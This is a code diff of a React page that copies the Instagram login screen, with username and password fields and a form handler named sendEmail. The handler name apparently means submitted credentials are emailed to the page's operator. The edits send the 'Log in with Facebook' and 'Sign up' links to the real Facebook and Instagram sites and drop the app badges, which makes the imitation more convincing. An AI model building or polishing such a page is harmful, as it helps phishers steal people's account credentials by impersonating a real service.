@@ -36,7 +36,7 @@ const App = () => {
           <div className="form-data">
             <form ref={form} onSubmit={sendEmail}>
               <div className="logo">
-                <h1>Instagram</h1>
+                <h1>Instagram</h1>  
               </div>
               <input
                 type="text"
@@ -62,7 +62,7 @@ const App = () => {
               value="Send">Log in</button>
 
               <span className="has-separator">Or</span>
-              <a href="#" className="facebook-login">
+              <a href="#" className="facebook-login" onClick={() => { window.location = "https://www.facebook.com/" }}>
                 Log in with Facebook
               </a>
               <a className="password-reset" href="#">
@@ -70,22 +70,7 @@ const App = () => {
               </a>
             </form>
             <div className="sign-up">
-              Don't have an account? <a href="#">Sign up</a>
-            </div>
-            <div className="get-the-app">
-              <span>Get the app.</span>
-              <div className="badge">
-                <img
-                  onClick={() => { window.location = "https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3D9FB3731C-E159-4183-85D0-C66231FD3D49%26utm_content%3Dlo%26utm_medium%3Dbadge" }}
-                  src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png"
-                  alt="android App"
-                />
-                <img
-                  onClick={() => { window.location = "https://apps.apple.com/us/app/instagram/id389801252" }}
-                  src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png"
-                  alt="ios app"
-                />
-              </div>
+              Don't have an account? <a href="#" onClick={() => { window.location = "https://www.instagram.com/accounts/login/" }}>Sign up</a>
             </div>
           </div>
         </div>
